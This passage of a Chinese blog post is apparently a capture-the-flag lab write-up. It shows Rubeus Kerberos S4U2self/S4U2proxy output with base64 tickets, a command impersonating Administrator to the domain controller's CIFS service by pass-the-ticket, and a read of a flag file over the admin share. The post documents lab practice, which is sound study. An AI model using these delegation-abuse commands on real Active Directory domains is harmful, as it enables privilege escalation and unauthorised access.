+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending S4U2self request to 172.22.2.3:88
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> S4U2self success!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got a TGS <span class="k">for</span> <span class="s1">&#39;Administrator&#39;</span> to <span class="s1">&#39;MSSQLSERVER$@XIAORANG.LAB&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> base64<span class="o">(</span>ticket.kirbi<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      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<span class="o">==</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Impersonating user <span class="s1">&#39;Administrator&#39;</span> to target SPN <span class="s1">&#39;ldap/DC.xiaorang.lab&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Building S4U2proxy request <span class="k">for</span> service: <span class="s1">&#39;ldap/DC.xiaorang.lab&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using domain controller: DC.xiaorang.lab <span class="o">(</span>172.22.2.3<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending S4U2proxy request to domain controller 172.22.2.3:88
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> S4U2proxy success!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> base64<span class="o">(</span>ticket.kirbi<span class="o">)</span> <span class="k">for</span> SPN <span class="s1">&#39;ldap/DC.xiaorang.lab&#39;</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      doIGhjCCBoKgAwIBBaEDAgEWooIFlTCCBZFhggWNMIIFiaADAgEFoQ4bDFhJQU9SQU5HLkxBQqIiMCCgAwIBAqEZMBcbBGxkYXAbD0RDLnhpYW9yYW5nLmxhYqOCBUwwggVIoAMCARKhAwIBBKKCBToEggU2KfIsDQb8JBYuYtA2mFDQTr5VDEoIHcc4poDvFoxBpN6QLO+HGQzhwGVFNyHmxjLRBeeWB/EBkdfkpPfZZHq71evgmkjlL6pmdBEGDwLtyEmxMktua+6ZA4pnauAMgZMLumIHQmMA0s3auiOHq2dFCRsTooCvJGOg6loAh2yigkC6cnQOCZ/sOkb33hHfL1eTu13vEkHaR5Ha+v6q52NYuEDih+HNaXvFrHuB0PCfsfy0/6/O7GGiR8DUWIXlP3ayeXJifqeKhHoxs14EeytAXAIgcw96YZTkk4HxRvFKP54PXBG5Hn2N6At+zAQzzdiCwJNHv13NIOLoYAXOpGt/aRsM7q0xW2ozoFsRVBTRpp+q+2cT8fiT+1cVLsbqOG3O4lJV4HFK1lw12HaSv2gl0p0cujCi2XoKS+4inxUmFeYTK4GRDzDdc2LfvNFKiWiuBW7FYW32sKVjsqPumhycw7OqzdPCwzbZ34YpE+5hL+R/YukhffN/tuGmnusrZRRlz6/Bbsf80KkHPtABnhmFGjJZ4bbWyLf/4yBXEOfq3jMy+fD/tKIRoUNO4B481m+DvE5tBoylj269VPSpjTj79k42NBLrG8SkXVOZ5Kg8jlu2Ggliaka5sfuxZXlerKSl2HOdS1jh6TYZkseEV8dc+0zbqkNN1iX0j0hKopf1IMGsP4OZ9EglHkEUstALIzTonXTBaPKeAxsnjEd6/3v+vx3d4VsCrT7cmkL4XD5Bm7lILOipnUNEmctL9o30vle2GGtldnF2w2c1kXc0ZsQpb3dOMfpPZhnT8q2GA+eUjmU83B4Tk0jpbTQs6hZJUh2ctpYIKmUqmux3E92K0akiiewIEw64gfUiCJXp2aadpgnWDo1aFcbYo0DEyyjTcaqBFmYSPtRXXKMMgkowVRdWnCRe6V8XqgWtCWF3r1EdD5nESpHHS+cLj67vVAFwbpV1rUTSGrFGihiY/w8fweTKsKJxkl9/lshFug/7ER0ReX6k95E0CC2NafJtOplDF9WnLdA1ZgsDF/NjJLJio2opbCE5jhoHbVO9E+sdHN53NsQ6yTxHqhBrJTIaPN3/Sg/RIkEnWDdbFVi+bCy/8U15Jza4shA65zK0b8V9s/Tw7YbeBTBXaW27fSHnC3WpUhHl4kRRXNrUfcz4ajZ3X/hGefqYq63l3MDlDsGd5pOy/dySYehLWe72zDBFKxDeyhkwCAUcEeZ2XDPq6RnRt7AHFlSrV62NBC1OFDySH1ZwR7JGGveG3SDh2UGKK7R6EzwHVRP+XQM324w5QoogVRSedEcYwRFQN9WysntDah4lLWM1Czt6Lyctw1knJE3yX3kW3bcrlNddDKsD4z+h+FX2KFiaXsqI0GTWhKekOWJkbbmA0ge5iNFFUwb3JQcPElQ4HpK00ZjpC5njTYta1HAsY+laatDoc7+qfECTpByWOaCUXWMH71FWxsnA+T4hBhjEZCYd2ZeMUU/jtSnFVFfm5LZD0DcqOS76h0d/I2zOJWRWxMoQRsBjR91oeewO4XU2/UVlV217cDktvvgsed7bVWhxzSlwRz4bFwaUWPd1bg5qf7G3rVMClHPsrGv/WefdW6lLp2kNSv1KZ0nGVycXqI5jHveBdV/gfipMoey+q+Zu32biVhoaB+1B9qtt/LExGY9G80PBmxz1d5VaRwIQwDILJNIvu3/1+JyVEPrfxf5EY114Px2qovOauk3YvixdmMM0clwLOx1Iw9m6DwC3KP6cnj3IuF5Pqw/yQhPQ4jglsO3sYsqjgdwwgdmgAwIBAKKB0QSBzn2ByzCByKCBxTCBwjCBv6AbMBmgAwIBEaESBBD+eyOSEQFDXqkGSJLHSJN0oQ4bDFhJQU9SQU5HLkxBQqIaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEClAAClERgPMjAyMzA3MjQwOTQxMTRaphEYDzIwMjMwNzI0MTk0MTA3WqcRGA8yMDIzMDczMTA5NDEwN1qoDhsMWElBT1JBTkcuTEFCqSIwIKADAgECoRkwFxsEbGRhcBsPREMueGlhb3JhbmcubGFi
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Ticket successfully imported!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 CIFS 服务的票据，并将得到的票据传递到内存中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">.<span class="se">\R</span>ubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:上面抓到的服务票据
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218214124-6j41qhv.png?imageSlim" title="image" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218214124-6j41qhv.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218214124-6j41qhv.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218214124-6j41qhv.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218214124-6j41qhv.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218214124-6j41qhv.png?imageSlim 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>​</p>
+<p>随后可读flag04</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">type</span> <span class="se">\D</span>C.xiaorang.lab<span class="se">\C</span>$<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\f</span>lag<span class="se">\f</span>lag04.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>‍</p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-02-18</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/chunqiuyunjing-brute4road/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\chunqiuyunjing-Brute4Road.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\chunqiuyunjing-Brute4Road.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F&body=|Field|Value|%0A|-|-|%0A|Title|%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F|%0A|Url|http://scofield1920.github.io/chunqiuyunjing-brute4road/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\chunqiuyunjing-Brute4Road.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/chunqiuyunjing-brute4road/" data-title="春秋云境-Brute4Road综合渗透" data-hashtags="penetration,wp"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/chunqiuyunjing-brute4road/" data-hashtag="penetration"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/chunqiuyunjing-brute4road/" data-title="春秋云境-Brute4Road综合渗透"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/chunqiuyunjing-brute4road/" data-title="春秋云境-Brute4Road综合渗透"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/chunqiuyunjing-brute4road/" data-title="春秋云境-Brute4Road综合渗透"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/chunqiuyunjing-brute4road/" data-title="春秋云境-Brute4Road综合渗透" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;春秋云境-Brute4Road综合渗透&#34;, &#34;http://scofield1920.github.io/chunqiuyunjing-brute4road/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/penetration/">Penetration</a>,&nbsp;<a href="/tags/wp/">Wp</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/chunqiuyunjing-delivery/" class="prev" rel="prev" title="春秋云境-Delivery综合渗透"><i class="fas fa-angle-left fa-fw"></i>春秋云境-Delivery综合渗透</a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.124.1">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div>
+    
+        
+        <script async src=" //busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js "></script>
+    
+
+    
+        
+            <section>
+                
+                    <span id="busuanzi_container_value_site_pv"><i class="far fa-eye fa-fw"></i>
+                        
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+
+                
+                    &nbsp;|&nbsp;              
+                
+
+                
+                    <span id="busuanzi_container_value_site_uv"><i class="fa fa-user"></i>
+                        
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+            </section>
+        
+
+        
+        
+    
+
+</footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Sc0fie1d-Blog","mobile-header-typeit":"Sc0fie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
